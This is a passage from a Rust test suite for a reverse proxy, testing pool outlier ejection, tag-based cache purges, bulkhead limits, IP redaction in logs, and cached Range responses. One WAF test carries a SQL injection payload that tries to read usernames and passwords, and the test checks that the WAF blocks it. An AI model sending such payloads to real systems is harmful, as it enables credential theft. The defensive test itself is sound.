    os[0].status.store(503, Ordering::Relaxed);
    burst(&st, "r", 40, 4).await;
    let frozen = hits(&os[0]);
    burst(&st, "r2", 20, 4).await;
    assert_eq!(hits(&os[0]), frozen, "ejected: nothing sent");
    os[0].status.store(200, Ordering::Relaxed);
    tokio::time::sleep(Duration::from_millis(1300)).await; // eject_secs = 1
                                                           // Back in rotation, but not necessarily within the first 40 requests: with two members
                                                           // the pick always goes to the lower load x latency, and the member that just failed can
                                                           // carry a latency peak from a loaded test run until it decays. Wait for it, bounded.
    let deadline = std::time::Instant::now() + Duration::from_secs(20);
    let mut round = 0;
    while hits(&os[0]) == frozen {
        assert!(
            std::time::Instant::now() < deadline,
            "not back in rotation 20 s after a 1 s cool-down"
        );
        burst(&st, &format!("r3-{round}-"), 40, 4).await;
        round += 1;
    }
}

#[tokio::test]
async fn a_reload_adds_and_removes_outlier_detection_through_the_real_rebuild() {
    let (os, st) = pool_rig(2, "").await;
    let urls: Vec<String> = os
        .iter()
        .map(|o| format!("http://127.0.0.1:{}", o.port.load(Ordering::Relaxed)))
        .collect();
    let cfg_of = |st: &Arc<AppState>| st.cfg().health_map[&urls[0]].pool.outlier_cfg();
    assert_eq!(cfg_of(&st), None);
    let reload = |st: &Arc<AppState>, extra: &str| {
        let prev = st.cfg();
        let next = crate::reload::rebuild(&cfg_pool(&os, extra), &prev, 1024).unwrap();
        assert!(
            Arc::ptr_eq(&prev.health_map[&urls[0]], &next.health_map[&urls[0]]),
            "entry reused"
        );
        st.config.store(Arc::new(next));
    };
    reload(&st, OUTLIER);
    assert_eq!(
        cfg_of(&st).map(|c| (c.min_requests, c.eject_secs)),
        Some((6, 30))
    );
    reload(&st, "outlier_detection = { eject_secs = 5 }");
    assert_eq!(
        cfg_of(&st).map(|c| (c.min_requests, c.eject_secs)),
        Some((20, 5))
    );
    reload(&st, "");
    assert_eq!(cfg_of(&st), None, "removed on reload");
}

#[tokio::test]
async fn the_first_route_decides_outlier_detection_even_when_it_opts_out() {
    let (os, _) = pool_rig(2, "").await;
    let urls = os
        .iter()
        .map(|o| format!("\"http://127.0.0.1:{}\"", o.port.load(Ordering::Relaxed)))
        .collect::<Vec<_>>()
        .join(", ");
    let build = |first: &str, second: &str| {
        let toml = format!(
            r#"
[server]
listen_http = "127.0.0.1:0"
listen_https = "127.0.0.1:0"
[tls]
cert_path = "/c"
key_path = "/k"
[upstream.plain]
urls = [{urls}]
{first}
[upstream.guarded]
urls = [{urls}]
{second}
[[route]]
path = "/a/{{*rest}}"
upstream = "plain"
[[route]]
path = "/b/{{*rest}}"
upstream = "guarded"
"#
        );
        AppState::for_tests(&toml::from_str::<ZionConfig>(&toml).unwrap())
    };
    let st = build("", OUTLIER);
    assert!(
        st.cfg()
            .health_map
            .values()
            .all(|h| h.pool.outlier_cfg().is_none()),
        "traffic through the opted-out pool must never be ejected"
    );
    let st = build(OUTLIER, "");
    assert!(st
        .cfg()
        .health_map
        .values()
        .all(|h| h.pool.outlier_cfg().is_some()));
}

#[tokio::test]
async fn sse_routes_over_a_pool_avoid_an_ejected_member() {
    let (os, st) = pool_rig(2, OUTLIER).await;
    // an `sse_stream` view of the same pool
    let urls = os
        .iter()
        .map(|o| format!("\"http://127.0.0.1:{}\"", o.port.load(Ordering::Relaxed)))
        .collect::<Vec<_>>()
        .join(", ");
    let toml = format!(
        r#"
[server]
listen_http = "127.0.0.1:0"
listen_https = "127.0.0.1:0"
[tls]
cert_path = "/c"
key_path = "/k"
[upstream.p]
urls = [{urls}]
{OUTLIER}
[[route]]
path = "/sse/{{*rest}}"
upstream = "p"
mode = "sse_stream"
"#
    );
    drop(st);
    let st = AppState::for_tests(&toml::from_str::<ZionConfig>(&toml).unwrap());
    let cfg = st.cfg();
    let pool_urls: Vec<String> = os
        .iter()
        .map(|o| format!("http://127.0.0.1:{}", o.port.load(Ordering::Relaxed)))
        .collect();
    // one timestamp for everything: the healthy member's successes must be inside the window
    let now = crate::breaker::now_ms();
    for _ in 0..30 {
        crate::pool::report(
            &cfg.health_map,
            &pool_urls,
            &pool_urls[1],
            true,
            Some(1),
            now,
        );
    }
    for _ in 0..10 {
        crate::pool::report(&cfg.health_map, &pool_urls, &pool_urls[0], false, None, now);
    }
    assert!(cfg.health_map[&pool_urls[0]].pool.is_ejected(now));
    for i in 0..20 {
        call(&st, &format!("/sse/{i}")).await;
    }
    assert_eq!(hits(&os[0]), 0, "the ejected member gets no SSE traffic");
    assert!(hits(&os[1]) > 0);
}

// ── Surrogate-Key: purge by tag ─────────────────────────────────────────────

fn surrogate(o: &Origin, tags: &str) {
    *o.extra.lock().unwrap() = Some(("Surrogate-Key".to_string(), tags.to_string()));
}

async fn purge_request(st: &Arc<AppState>, query: &str, from: &str) -> (u16, String) {
    let req = Request::builder()
        .method(Method::POST)
        .uri(format!("/_zion/cache/purge{query}"))
        .body(Full::new(Bytes::new()).map_err(|n| match n {}).boxed())
        .unwrap();
    let resp = process_request(req, st.clone(), from.parse::<SocketAddr>().unwrap(), false)
        .await
        .unwrap();
    let status = resp.status().as_u16();
    let body = String::from_utf8(
        resp.into_body()
            .collect()
            .await
            .unwrap()
            .to_bytes()
            .to_vec(),
    )
    .unwrap();
    (status, body)
}

#[tokio::test]
async fn purging_by_tag_through_the_endpoint_drops_exactly_the_tagged_entries() {
    let (o, st) = rig("").await;
    surrogate(&o, "post-1 section-a");
    fetch(&st, "/t/one", &[]).await;
    surrogate(&o, "post-2 section-a");
    fetch(&st, "/t/two", &[]).await;
    *o.extra.lock().unwrap() = None;
    fetch(&st, "/t/plain", &[]).await;
    settle().await;
    for p in ["/t/one", "/t/two", "/t/plain"] {
        assert_eq!(fetch(&st, p, &[]).await.0, "HIT", "{p} is cached");
    }
    let before = hits(&o);

    let (code, body) = purge_request(&st, "?tag=post-1", "127.0.0.1:1").await;
    assert_eq!(code, 200, "{body}");
    assert!(body.contains("\"purged\":1"), "{body}");
    assert_eq!(
        fetch(&st, "/t/one", &[]).await.0,
        "MISS",
        "tagged entry is gone"
    );
    assert_eq!(
        fetch(&st, "/t/two", &[]).await.0,
        "HIT",
        "other tag untouched"
    );
    assert_eq!(
        fetch(&st, "/t/plain", &[]).await.0,
        "HIT",
        "untagged untouched"
    );
    assert_eq!(hits(&o), before + 1);

    // a shared tag takes several entries at once, and tags are repeatable / comma-separated
    let (_, body) = purge_request(
        &st,
        "?tag=section-a&tag=nothing,also-nothing",
        "127.0.0.1:1",
    )
    .await;
    assert!(
        body.contains("\"tags\":[\"section-a\",\"nothing\",\"also-nothing\"]"),
        "{body}"
    );
    assert_eq!(fetch(&st, "/t/two", &[]).await.0, "MISS");
}

#[tokio::test]
async fn the_tag_purge_endpoint_is_internal_only_and_post_only() {
    let (o, st) = rig("").await;
    surrogate(&o, "keep-me");
    fetch(&st, "/t/guard", &[]).await;
    settle().await;
    let (code, _) = purge_request(&st, "?tag=keep-me", "203.0.113.9:1").await;
    assert_eq!(code, 403, "an outside client cannot purge");
    assert_eq!(fetch(&st, "/t/guard", &[]).await.0, "HIT");
}

#[tokio::test]
async fn surrogate_key_is_not_sent_to_clients() {
    let (o, st) = rig("").await;
    surrogate(&o, "post-1");
    for _ in 0..2 {
        let resp = process_request(
            get("/t/hdr", &[]),
            st.clone(),
            "203.0.113.9:1".parse::<SocketAddr>().unwrap(),
            false,
        )
        .await
        .unwrap();
        assert!(resp.headers().get("surrogate-key").is_none());
        let _ = resp.into_body().collect().await;
        settle().await;
    }
}

#[tokio::test]
async fn a_response_whose_tags_cannot_be_tracked_is_not_cached() {
    let (o, st) = rig("").await;
    let too_many = (0..40)
        .map(|i| format!("t{i}"))
        .collect::<Vec<_>>()
        .join(" ");
    surrogate(&o, &too_many);
    assert_eq!(fetch(&st, "/t/many", &[]).await.0, "BYPASS");
    settle().await;
    assert_eq!(fetch(&st, "/t/many", &[]).await.0, "BYPASS", "never stored");
    assert_eq!(hits(&o), 2);
}

#[tokio::test]
async fn a_tag_purge_while_a_fetch_is_in_flight_keeps_that_response_out_of_the_cache() {
    let (o, st) = rig("").await;
    surrogate(&o, "post-1");
    o.delay_ms.store(300, Ordering::Relaxed);
    let st2 = st.clone();
    let slow = tokio::spawn(async move { fetch(&st2, "/t/race", &[]).await });
    tokio::time::sleep(Duration::from_millis(100)).await;
    let (code, _) = purge_request(&st, "?tag=post-1", "127.0.0.1:1").await;
    assert_eq!(code, 200);
    slow.await.unwrap();
    settle().await;
    o.delay_ms.store(0, Ordering::Relaxed);
    assert_eq!(
        fetch(&st, "/t/race", &[]).await.0,
        "MISS",
        "the response that began before the purge must not outlive it"
    );
}

#[tokio::test]
async fn an_empty_tag_parameter_does_not_flush_the_cache() {
    let (o, st) = rig("").await;
    *o.extra.lock().unwrap() = None;
    fetch(&st, "/t/keep", &[]).await;
    settle().await;
    for q in ["?tag=", "?tag=,,", "?tag=&prefix=/t"] {
        let (code, _) = purge_request(&st, q, "127.0.0.1:1").await;
        assert_eq!(code, 400, "{q}");
    }
    assert_eq!(
        fetch(&st, "/t/keep", &[]).await.0,
        "HIT",
        "nothing was purged"
    );
    // no tag parameter at all is still the legacy "everything"
    let (code, _) = purge_request(&st, "", "127.0.0.1:1").await;
    assert_eq!(code, 200);
    assert_eq!(fetch(&st, "/t/keep", &[]).await.0, "MISS");
}

// ── bulkhead: [upstream.x] max_in_flight ────────────────────────────────────

/// The bulkhead counter is keyed by upstream *name* (one config per process in production), so
/// each test names its upstream uniquely instead of sharing "o" with the rest of the suite.
fn cfg_named(name: &str, port: u16, upstream_extra: &str) -> ZionConfig {
    let toml = format!(
        r#"
[server]
listen_http = "127.0.0.1:0"
listen_https = "127.0.0.1:0"

[tls]
cert_path = "/c"
key_path = "/k"

[upstream.{name}]
url = "http://127.0.0.1:{port}"
{upstream_extra}

[cache_profile.c]
ttl_seconds = 3600
max_entries = 100

[[route]]
path = "/plain/{{*rest}}"
upstream = "{name}"

[[route]]
path = "/cached/{{*rest}}"
upstream = "{name}"
mode = "static_cache"
cache_profile = "c"
"#
    );
    toml::from_str::<ZionConfig>(&toml).expect("config parses")
}

async fn status_and_headers(
    st: &Arc<AppState>,
    uri: &str,
) -> (u16, Option<String>, Option<String>) {
    let resp = process_request(
        get(uri, &[]),
        st.clone(),
        "203.0.113.9:1".parse::<SocketAddr>().unwrap(),
        false,
    )
    .await
    .unwrap();
    let h = |n: &str| {
        resp.headers()
            .get(n)
            .and_then(|v| v.to_str().ok())
            .map(str::to_string)
    };
    let out = (
        resp.status().as_u16(),
        h("retry-after"),
        h("x-zion-bulkhead"),
    );
    let _ = resp.into_body().collect().await;
    out
}

#[tokio::test]
async fn an_upstream_at_max_in_flight_sheds_the_overflow_at_once_and_recovers() {
    let (o, _) = rig("").await;
    let port = o.port.load(Ordering::Relaxed);
    let st = AppState::for_tests(&cfg_named("bh-shed", port, "max_in_flight = 2"));
    o.delay_ms.store(300, Ordering::Relaxed);

    let t = std::time::Instant::now();
    let results = join_all((0..6).map(|i| {
        let st = st.clone();
        async move { status_and_headers(&st, &format!("/plain/bh{i}")).await }
    }))
    .await;
    let ok = results.iter().filter(|r| r.0 == 200).count();
    let shed: Vec<_> = results.iter().filter(|r| r.0 == 503).collect();
    assert_eq!(ok, 2, "exactly max_in_flight got through: {results:?}");
    assert_eq!(shed.len(), 4, "{results:?}");
    assert!(shed
        .iter()
        .all(|r| r.1.as_deref() == Some("1") && r.2.as_deref() == Some("full")));
    assert_eq!(hits(&o), 2, "the shed requests never reached the origin");
    assert!(t.elapsed() < Duration::from_millis(2000));

    // the slots were freed when the responses finished
    o.delay_ms.store(0, Ordering::Relaxed);
    for i in 0..4 {
        assert_eq!(
            status_and_headers(&st, &format!("/plain/after{i}")).await.0,
            200
        );
    }
    let c = crate::bulkhead::counter("bh-shed");
    assert_eq!(c.in_flight(), 0);
    assert!(c.shed() >= 4);
}

#[tokio::test]
async fn shed_requests_are_not_upstream_failures_to_the_circuit_breaker() {
    let (o, _) = rig("").await;
    let port = o.port.load(Ordering::Relaxed);
    let st = AppState::for_tests(&cfg_named(
        "bh-breaker",
        port,
        &format!("{BREAKER}\nmax_in_flight = 1"),
    ));
    o.delay_ms.store(150, Ordering::Relaxed);
    // many more shed (503) than the breaker's min_requests: if they counted it would open
    for _ in 0..3 {
        let results = join_all((0..8).map(|i| {
            let st = st.clone();
            async move { status_and_headers(&st, &format!("/plain/br{i}")).await }
        }))
        .await;
        assert!(results.iter().filter(|r| r.0 == 503).count() >= 6);
    }
    o.delay_ms.store(0, Ordering::Relaxed);
    let (code, _, _) = status_and_headers(&st, "/plain/still-closed").await;
    assert_eq!(code, 200, "the circuit never opened");
    let entry = st.cfg().health_map.values().next().unwrap().clone();
    assert!(
        matches!(
            entry.breaker.check(crate::breaker::now_ms()),
            crate::breaker::Check::Allow
        ),
        "closed"
    );
}

#[tokio::test]
async fn a_reload_changes_the_limit_at_once_and_keeps_the_count() {
    let (o, _) = rig("").await;
    let port = o.port.load(Ordering::Relaxed);
    let st = AppState::for_tests(&cfg_named("bh-reload", port, "max_in_flight = 1"));
    o.delay_ms.store(400, Ordering::Relaxed);
    let st2 = st.clone();
    let held = tokio::spawn(async move { status_and_headers(&st2, "/plain/held").await });
    tokio::time::sleep(Duration::from_millis(100)).await;
    assert_eq!(
        status_and_headers(&st, "/plain/x").await.0,
        503,
        "at the limit"
    );
    // an unrelated reload (same limit) while the first request is still in flight: the count
    // is the upstream's, not the snapshot's, so it must still be at the limit
    let prev = st.cfg();
    let same = crate::reload::rebuild(
        &cfg_named("bh-reload", port, "max_in_flight = 1"),
        &prev,
        1024,
    )
    .unwrap();
    st.config.store(Arc::new(same));
    assert_eq!(
        status_and_headers(&st, "/plain/same").await.0,
        503,
        "a reload does not reset the in-flight count"
    );
    // reload to a higher limit while the first request is still in flight
    let prev = st.cfg();
    let next = crate::reload::rebuild(
        &cfg_named("bh-reload", port, "max_in_flight = 5"),
        &prev,
        1024,
    )
    .unwrap();
    st.config.store(Arc::new(next));
    assert_eq!(
        status_and_headers(&st, "/plain/y").await.0,
        200,
        "the new limit applies at once"
    );
    assert_eq!(held.await.unwrap().0, 200);
    // and the limit can be removed entirely
    let prev = st.cfg();
    let next = crate::reload::rebuild(&cfg_named("bh-reload", port, ""), &prev, 1024).unwrap();
    st.config.store(Arc::new(next));
    o.delay_ms.store(0, Ordering::Relaxed);
    assert_eq!(status_and_headers(&st, "/plain/z").await.0, 200);
}

#[tokio::test]
async fn cache_hits_do_not_use_a_slot() {
    let (o, _) = rig("").await;
    let port = o.port.load(Ordering::Relaxed);
    let st = AppState::for_tests(&cfg_named("bh-cache", port, "max_in_flight = 1"));
    assert_eq!(status_and_headers(&st, "/cached/a").await.0, 200);
    settle().await;
    // a held slot on the plain route must not stop cached responses
    o.delay_ms.store(300, Ordering::Relaxed);
    let st2 = st.clone();
    let held = tokio::spawn(async move { status_and_headers(&st2, "/plain/slow").await });
    tokio::time::sleep(Duration::from_millis(80)).await;
    for _ in 0..5 {
        assert_eq!(fetch(&st, "/cached/a", &[]).await.0, "HIT");
    }
    held.await.unwrap();
}

#[tokio::test]
async fn the_slot_is_held_until_the_client_has_read_the_response_body() {
    let (o, _) = rig("").await;
    let port = o.port.load(Ordering::Relaxed);
    let st = AppState::for_tests(&cfg_named("bh-body", port, "max_in_flight = 1"));
    // a body big enough to be streamed in several frames
    *o.big.lock().unwrap() = Some((400_000, true));
    let resp = process_request(
        get("/plain/stream", &[]),
        st.clone(),
        "203.0.113.9:1".parse::<SocketAddr>().unwrap(),
        false,
    )
    .await
    .unwrap();
    assert_eq!(resp.status(), 200);
    // headers are out but the body is unread: the upstream is still busy with this response
    assert_eq!(status_and_headers(&st, "/plain/other").await.0, 503);
    let body = resp.into_body().collect().await.unwrap().to_bytes();
    assert_eq!(body.len(), 400_000);
    assert_eq!(
        crate::bulkhead::counter("bh-body").in_flight(),
        0,
        "freed at the end of the body"
    );
    assert_eq!(status_and_headers(&st, "/plain/other").await.0, 200);

    // a client that goes away mid-body frees the slot too
    let resp = process_request(
        get("/plain/abandoned", &[]),
        st.clone(),
        "203.0.113.9:1".parse::<SocketAddr>().unwrap(),
        false,
    )
    .await
    .unwrap();
    assert_eq!(status_and_headers(&st, "/plain/other").await.0, 503);
    drop(resp);
    assert_eq!(status_and_headers(&st, "/plain/other").await.0, 200);
}

// ── [redact] ip: what the access log really prints ────────────────────────

/// A subscriber that collects every formatted event into a buffer.
#[derive(Clone, Default)]
struct Capture(Arc<Mutex<Vec<u8>>>);
impl std::io::Write for Capture {
    fn write(&mut self, b: &[u8]) -> std::io::Result<usize> {
        self.0.lock().unwrap().extend_from_slice(b);
        Ok(b.len())
    }
    fn flush(&mut self) -> std::io::Result<()> {
        Ok(())
    }
}
impl<'a> tracing_subscriber::fmt::MakeWriter<'a> for Capture {
    type Writer = Capture;
    fn make_writer(&'a self) -> Capture {
        self.clone()
    }
}

async fn access_log_line(redact: &str) -> String {
    let (_o, _) = rig("").await;
    let port = _o.port.load(Ordering::Relaxed);
    let mut cfg = cfg_for(port, "");
    cfg.redact = toml::from_str(redact).unwrap();
    let st = AppState::for_tests(&cfg);
    let cap = Capture::default();
    let sub = tracing_subscriber::fmt()
        .with_writer(cap.clone())
        .with_ansi(false)
        .with_max_level(tracing::Level::INFO)
        .finish();
    let _guard = tracing::subscriber::set_default(sub);
    // `tracing` caches, per call site, whether anyone is listening. Tests running in parallel
    // reach the access-log call site while no subscriber exists and can leave "nobody" cached
    // for a moment: rebuild it for ours, and ask again rather than flake.
    for attempt in 0..5 {
        tracing::callsite::rebuild_interest_cache();
        let resp = process_request(
            get(&format!("/ip/x{attempt}"), &[]),
            st.clone(),
            "203.0.113.9:4242".parse::<SocketAddr>().unwrap(),
            false,
        )
        .await
        .unwrap();
        let _ = resp.into_body().collect().await;
        let out = String::from_utf8(cap.0.lock().unwrap().clone()).unwrap();
        if let Some(l) = out.lines().find(|l| l.contains("remote_ip")) {
            return l.to_string();
        }
    }
    String::new()
}

#[tokio::test]
async fn the_access_log_writes_the_client_ip_as_configured() {
    let full = access_log_line("").await;
    assert!(
        full.contains("remote_ip=203.0.113.9"),
        "default is the address as is: {full}"
    );
    let tr = access_log_line("ip = \"truncate\"").await;
    assert!(tr.contains("remote_ip=203.0.113.0/24"), "{tr}");
    assert!(
        !tr.contains("203.0.113.9"),
        "the full address must not be in the line: {tr}"
    );
    let hm =
        access_log_line("ip = \"hmac\"\nip_hmac_key = \"0123456789abcdef0123456789abcdef\"").await;
    assert!(hm.contains("remote_ip=ip:"), "{hm}");
    assert!(!hm.contains("203.0.113"), "{hm}");
}

#[tokio::test]
async fn the_audit_trail_records_the_client_ip_as_configured() {
    for (redact, want, forbid) in [
        ("", "203.0.113.9", ""),
        ("ip = \"truncate\"", "203.0.113.0/24", "203.0.113.9"),
        (
            "ip = \"hmac\"\nip_hmac_key = \"0123456789abcdef0123456789abcdef\"",
            "ip:",
            "203.0.113",
        ),
    ] {
        let (o, _) = rig("").await;
        let mut cfg = cfg_for(o.port.load(Ordering::Relaxed), "");
        cfg.redact = toml::from_str(redact).unwrap();
        let (handle, mut rx) = crate::audit::AuditHandle::capture();
        let st = AppState::for_tests_with_audit(&cfg, handle);
        let resp = process_request(
            get("/aud/x", &[]),
            st,
            "203.0.113.9:4242".parse::<SocketAddr>().unwrap(),
            false,
        )
        .await
        .unwrap();
        let _ = resp.into_body().collect().await;
        let mut seen = Vec::new();
        while let Ok(ev) = rx.try_recv() {
            seen.push(ev);
        }
        let ev = seen
            .iter()
            .find(|e| e.kind == crate::audit::kind::REQUEST_COMPLETED)
            .unwrap_or_else(|| panic!("no request_completed event in {} events", seen.len()));
        let ip = ev.remote_ip.clone().unwrap();
        assert!(ip.contains(want), "[{redact}] audit remote_ip = {ip}");
        assert!(
            forbid.is_empty() || !ip.contains(forbid),
            "[{redact}] audit remote_ip = {ip}"
        );
    }
}

#[tokio::test]
async fn a_waf_block_is_audited_with_the_configured_client_ip_too() {
    let (o, _) = rig("").await;
    let port = o.port.load(Ordering::Relaxed);
    let toml = format!(
        r#"
[server]
listen_http = "127.0.0.1:0"
listen_https = "127.0.0.1:0"
[tls]
cert_path = "/c"
key_path = "/k"
[upstream.w]
url = "http://127.0.0.1:{port}"
[redact]
ip = "truncate"
[[route]]
path = "/waf/{{*rest}}"
upstream = "w"
waf = true
"#
    );
    let cfg = toml::from_str::<ZionConfig>(&toml).unwrap();
    let (handle, mut rx) = crate::audit::AuditHandle::capture();
    let st = AppState::for_tests_with_audit(&cfg, handle);
    let attack = Request::builder()
        .method(Method::POST)
        .uri("/waf/x")
        .body(
            Full::new(Bytes::from_static(
                b"id=1' UNION SELECT username,password FROM users--",
            ))
            .map_err(|n| match n {})
            .boxed(),
        )
        .unwrap();
    let resp = process_request(
        attack,
        st,
        "203.0.113.9:4242".parse::<SocketAddr>().unwrap(),
        false,
    )
    .await
    .unwrap();
    assert_eq!(resp.status(), 400, "the WAF blocked it");
    let mut ip = None;
    while let Ok(ev) = rx.try_recv() {
        if ev.kind == "request_blocked" {
            ip = ev.remote_ip;
        }
    }
    assert_eq!(ip.as_deref(), Some("203.0.113.0/24"));
}

// ── Range requests served from the cache (RFC 9110 §14) ─────────────────────

/// A `GET` through the pipeline with `headers`; returns (status, headers, body).
async fn raw(
    st: &Arc<AppState>,
    uri: &str,
    headers: &[(&str, &str)],
) -> (u16, hyper::HeaderMap, Vec<u8>) {
    let resp = process_request(
        get(uri, headers),
        st.clone(),
        "203.0.113.9:1".parse::<SocketAddr>().unwrap(),
        false,
    )
    .await
    .unwrap();
    let (status, h) = (resp.status().as_u16(), resp.headers().clone());
    let body = resp
        .into_body()
        .collect()
        .await
        .unwrap()
        .to_bytes()
        .to_vec();
    (status, h, body)
}

/// A cached object with a known body: `-|<0123456789abcdefghijklmnopqrstuvwxyz>|-|-`.
async fn cached_object(etag: Option<&str>) -> (Arc<Origin>, Arc<AppState>, Vec<u8>) {
    let (o, st) = rig("").await;
    if let Some(e) = etag {
        *o.extra.lock().unwrap() = Some(("ETag".to_string(), e.to_string()));
    }
    let x = [("x-foo", "0123456789abcdefghijklmnopqrstuvwxyz")];
    let (_, _, full) = raw(&st, "/r/obj", &x).await;
    settle().await;
    assert_eq!(fetch(&st, "/r/obj", &x).await.0, "HIT", "cached");
    (o, st, full)
}
const X: [(&str, &str); 1] = [("x-foo", "0123456789abcdefghijklmnopqrstuvwxyz")];

fn with_range(range: &str) -> Vec<(&str, &str)> {
    let mut h = X.to_vec();
    h.push(("range", range));
    h
}

#[tokio::test]
async fn a_range_on_a_cached_object_is_a_partial_content_from_the_cache() {
    let (o, st, full) = cached_object(None).await;
    let n = full.len();
    let hits_before = hits(&o);
    for (spec, start, end) in [
        ("bytes=2-5", 2, 5),
        ("bytes=-4", n - 4, n - 1),
        ("bytes=10-", 10, n - 1),
        ("bytes=0-0", 0, 0),
        ("bytes=5-9999", 5, n - 1), // clamped to the last byte
    ] {
        let (code, h, body) = raw(&st, "/r/obj", &with_range(spec)).await;
        assert_eq!(code, 206, "{spec}");
        assert_eq!(body, full[start..=end], "{spec}");
        assert_eq!(
            h.get("content-range").unwrap().to_str().unwrap(),
            format!("bytes {start}-{end}/{n}"),
            "{spec}"
        );
        assert_eq!(h.get("x-zion-cache").unwrap(), "HIT");
        assert_eq!(h.get("accept-ranges").unwrap(), "bytes");
        assert_eq!(body.len(), end - start + 1, "{spec}");
    }
    assert_eq!(
        hits(&o),
        hits_before,
        "every slice came from the cache, never the origin"
    );
}

#[tokio::test]
async fn an_unsatisfiable_range_is_416_with_the_size_and_other_forms_get_the_whole_object() {
    let (_o, st, full) = cached_object(None).await;
    let n = full.len();
    let (code, h, body) = raw(&st, "/r/obj", &with_range(&format!("bytes={n}-"))).await;
    assert_eq!(code, 416);
    assert_eq!(
        h.get("content-range").unwrap().to_str().unwrap(),
        format!("bytes */{n}")
    );
    assert!(body.is_empty());
    // a form we do not serve as a partial is simply the whole object (RFC 9110 §14.2)
    for spec in [
        "bytes=0-1,3-4",
        "items=0-1",
        "bytes=a-b",
        "bytes=",
        "garbage",
    ] {
        let (code, _, body) = raw(&st, "/r/obj", &with_range(spec)).await;
        assert_eq!(code, 200, "{spec}");
        assert_eq!(body, full, "{spec}");
    }
}

#[tokio::test]
async fn if_range_decides_between_the_slice_and_the_whole_object() {
    let (_o, st, full) = cached_object(Some("\"v1\"")).await;
    let range = |ir: &'static str| {
        let mut h = with_range("bytes=2-5");
        h.push(("if-range", ir));
        h
    };
    let (code, _, body) = raw(&st, "/r/obj", &range("\"v1\"")).await;
    assert_eq!(
        (code, &body[..]),
        (206, &full[2..=5]),
        "the strong ETag matches: the slice"
    );
    let (code, _, body) = raw(&st, "/r/obj", &range("\"v2\"")).await;
    assert_eq!(
        (code, body),
        (200, full.clone()),
        "a different ETag: the whole object"
    );
    let (code, _, _) = raw(&st, "/r/obj", &range("W/\"v1\"")).await;
    assert_eq!(code, 200, "a weak tag never satisfies If-Range");
    let (code, _, _) = raw(&st, "/r/obj", &range("Wed, 21 Oct 2015 07:28:00 GMT")).await;
    assert_eq!(code, 200, "a date that is not the stored Last-Modified");
}

#[tokio::test]
async fn a_weak_stored_etag_never_satisfies_an_entity_tag_if_range() {
    let (_o, st, full) = cached_object(Some("W/\"v1\"")).await;
    let mut h = with_range("bytes=2-5");
    h.push(("if-range", "W/\"v1\""));
    assert_eq!(raw(&st, "/r/obj", &h).await.2, full);
    let mut h = with_range("bytes=2-5");
    h.push(("if-range", "\"v1\""));
    assert_eq!(raw(&st, "/r/obj", &h).await.0, 200);
    // without If-Range the range is served whatever the validator is
    assert_eq!(raw(&st, "/r/obj", &with_range("bytes=2-5")).await.0, 206);
}

#[tokio::test]
async fn a_matching_conditional_wins_over_the_range_and_the_validators_are_echoed() {
    let (_o, st, _full) = cached_object(Some("\"v1\"")).await;
    let mut h = with_range("bytes=2-5");
    h.push(("if-none-match", "\"v1\""));
    let (code, _, body) = raw(&st, "/r/obj", &h).await;
    assert_eq!(code, 304, "preconditions are evaluated before Range");
    assert!(body.is_empty());
    let (code, hdrs, _) = raw(&st, "/r/obj", &X).await;
    assert_eq!(code, 200);
    assert_eq!(
        hdrs.get("etag").unwrap(),
        "\"v1\"",
        "a plain hit carries the origin's ETag"
    );
    assert_eq!(hdrs.get("accept-ranges").unwrap(), "bytes");
    let (_, hdrs, _) = raw(&st, "/r/obj", &with_range("bytes=2-5")).await;
    assert_eq!(hdrs.get("etag").unwrap(), "\"v1\"", "and so does a 206");
}

#[tokio::test]
async fn a_range_on_an_uncached_object_goes_to_the_origin() {
    // not cached yet: the request goes to the origin (which here ignores Range)
    let (o, st) = rig("").await;
    let (code, _, body) = raw(&st, "/r/miss", &with_range("bytes=2-5")).await;
    assert_eq!(code, 200);
    assert!(!body.is_empty());
    assert_eq!(hits(&o), 1);
}

#[tokio::test]
async fn several_range_header_lines_are_a_combined_request_and_get_the_whole_object() {
    let (_o, st, full) = cached_object(None).await;
    let mut h = with_range("bytes=2-5");
    h.push(("range", "bytes=10-12"));
    let (code, _, body) = raw(&st, "/r/obj", &h).await;
    assert_eq!(code, 200, "two Range lines are not one range");
    assert_eq!(body, full);
}

#[tokio::test]
async fn only_if_cached_hits_get_the_same_304_range_whole_treatment() {
    let (_o, st, full) = cached_object(Some("\"v1\"")).await;
    let oic = |extra: &[(&'static str, &'static str)]| {
        let mut h = with_range("bytes=2-5");
        h.push(("cache-control", "only-if-cached"));
        h.extend_from_slice(extra);
        h
    };
    let (code, hdrs, body) = raw(&st, "/r/obj", &oic(&[])).await;
    assert_eq!(
        (code, &body[..]),
        (206, &full[2..=5]),
        "a Range on an only-if-cached hit"
    );
    assert_eq!(
        hdrs.get("content-range").unwrap().to_str().unwrap(),
        format!("bytes 2-5/{}", full.len())
    );
    let (code, _, body) = raw(&st, "/r/obj", &oic(&[("if-none-match", "\"v1\"")])).await;
    assert_eq!(code, 304, "a matching precondition still wins");
    assert!(body.is_empty());
    let mut plain = X.to_vec();
    plain.push(("cache-control", "only-if-cached"));
    let (code, _, body) = raw(&st, "/r/obj", &plain).await;
    assert_eq!((code, body), (200, full), "no Range: the whole object");
}

// ── #484: one entry for an identity body, whatever the Accept-Encoding ─────

const CHROME: (&str, &str) = ("accept-encoding", "gzip, deflate, br, zstd");
const SAFARI: (&str, &str) = ("accept-encoding", "gzip, deflate, br");

/// (x-zion-cache, content-encoding, body)
async fn fetch_ce(
    st: &Arc<AppState>,
    uri: &str,
    headers: &[(&str, &str)],
) -> (String, String, String) {
    let resp = process_request(
        get(uri, headers),
        st.clone(),
        "203.0.113.9:1".parse::<SocketAddr>().unwrap(),
        false,
    )
    .await
    .unwrap();
    let h = |n: &str| {
        resp.headers()
            .get(n)
            .and_then(|v| v.to_str().ok())
            .unwrap_or("")
            .to_string()
    };
    let (cache, ce) = (h("x-zion-cache"), h("content-encoding"));
    let body = String::from_utf8(
        resp.into_body()
            .collect()
            .await
            .unwrap()
            .to_bytes()
            .to_vec(),
    )
    .unwrap();
    (cache, ce, body)
}

#[tokio::test]
async fn an_identity_body_is_fetched_once_for_every_accept_encoding() {
    let (o, st) = rig("").await;
    assert_eq!(fetch(&st, "/ae/one", &[SAFARI]).await.0, "MISS");
    settle().await;
    for h in [
        &[SAFARI][..],
        &[CHROME][..],
        &[][..],
        &[("accept-encoding", "br")][..],
        &[("accept-encoding", "gzip")][..],
    ] {
        assert_eq!(fetch(&st, "/ae/one", h).await.0, "HIT", "{h:?}");
    }
    assert_eq!(hits(&o), 1, "one origin fetch for one identical object");
}

#[tokio::test]
async fn concurrent_cold_requests_with_different_encodings_coalesce() {
    let (o, st) = rig("").await;
    o.delay_ms.store(200, Ordering::Relaxed);
